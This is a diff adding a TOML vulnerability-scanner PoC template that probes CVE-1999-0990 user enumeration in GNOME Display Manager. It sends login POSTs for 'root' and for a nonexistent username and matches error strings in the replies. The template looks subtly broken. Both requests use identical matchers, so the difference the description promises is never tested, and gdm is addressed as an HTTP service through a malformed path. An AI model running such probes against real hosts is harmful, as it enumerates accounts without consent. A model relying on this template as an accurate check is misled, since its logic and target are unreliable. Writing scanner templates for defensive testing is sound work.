@@ -1,0 +1,62 @@
+[info]
+author = "ave"
+description = "GNOME Display Manager (gdm) 在启用 VerboseAuth 设置时，针对不存在与存在的用户会返回差异化的认证错误消息。本 PoC 通过向 gdm 登录接口分别提交已知存在和已知不存在的用户名，对比返回的错误提示差异，验证目标是否可通过错误消息枚举有效用户账户。"
+id = "POC-AVE-1999-0823"
+name = "CVE-1999-0990 gdm VerboseAuth 用户枚举 PoC"
+severity = "low"
+tags = ["ave-1999-0823"]
+vuln_id = [
+    "CVE-1999-0990",
+    "AVE-1999-0823",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/gdm/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=root&password=invalid"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "authentication failure",
+    "user does not exist",
+    "invalid password",
+    "no such user",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/gdm/login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=this_user_should_not_exist_zzz&password=invalid"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "authentication failure",
+    "user does not exist",
+    "invalid password",
+    "no such user",
+]
